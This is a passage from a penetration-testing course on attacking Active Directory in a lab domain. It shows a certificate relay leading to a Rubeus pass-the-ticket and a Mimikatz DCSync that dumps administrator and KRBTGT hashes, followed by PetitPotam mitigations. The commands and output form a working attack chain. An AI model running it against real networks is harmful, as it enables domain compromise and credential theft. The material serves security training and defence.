Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up...
```

Alternatively, once we obtain the base64 certificate via  ntlmrelayx.py, we could use the certificate with the Rubeus tool on a  Windows attack host to request a TGT ticket and perform a  pass-the-ticket (PTT) attack all at once.

Note: We would need to use the `MS01` attack host in another section, such as the `ACL Abuse Tactics` or `Privileged Access` section once we have the base64 certificate saved down to our notes to perform this using Rubeus.

#### Requesting TGT and Performing PTT with DC01$ Machine Account

​                                                                                                        Bleeding Edge Vulnerabilities                      

```powershell-session
PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
[*] Using domain controller: 172.16.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
 doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  ACADEMY-EA-DC01$
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  3/30/2022 3:50:25 PM
  EndTime                  :  3/31/2022 1:50:25 AM
  RenewTill                :  4/6/2022 3:50:25 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
```

We can then type `klist` to confirm that the ticket is in memory.

#### Confirming the Ticket is in Memory

​                                                                                                        Bleeding Edge Vulnerabilities                      

```powershell-session
PS C:\Tools> klist

Current LogonId is 0:0x4e56b

Cached Tickets: (3)

#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 3/30/2022 15:50:25 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 3/30/2022 15:53:09 (local)
        End Time:   3/31/2022 1:50:25 (local)
        Renew Time: 4/6/2022 15:50:25 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

Again, since Domain Controllers have replication privileges in the  domain, we can use the pass-the-ticket to perform a DCSync attack using  Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and  establish persistence. We could obtain the NT hash for any privileged  user using DCSync and move forward to the next phase of our assessment.

#### Performing DCSync with Mimikatz

​                                                                                                        Bleeding Edge Vulnerabilities                      

```powershell-session
PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'inlanefreight\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 10/27/2021 8:14:34 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
    lm  - 0: 4562458c201a97fa19365ce901513c21
```

------

### PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate  Authority Web Enrollment and Certificate Enrollment Web Service services are in use

For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using  authenticated API calls. This shows that just applying the  CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain  user credentials can still perform attacks against AD CS in many  instances. The whitepaper also details other hardening and detection  steps that can be taken to harden AD CS.

------

### Recap

In this section we covered three recent attacks:

- NoPac (SamAccountName Spoofing)
- PrintNightmare (remotely)
- PetitPotam (MS-EFSRPC)

Each of these attacks can be performed with either standard domain  user access (NoPac and PrintNightmare) or without any type of  authentication to the domain at all (PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each  attack, and we covered a few. Active Directory attacks continue to  evolve, and these are surely not the last extremely high-impact attack  vectors that we will see. When these types of attacks are released, we  should strive to build a small lab environment to practice them in, so  we are ready to use them safely and effectively in a real-world  engagement should the opportunity arise. Understanding how to set up  these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact,  remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.

In the next section, we'll talk through various other issues that we  see from time to time in Active Directory environments that could help  us further our access or lead to additional findings for our final  client report.
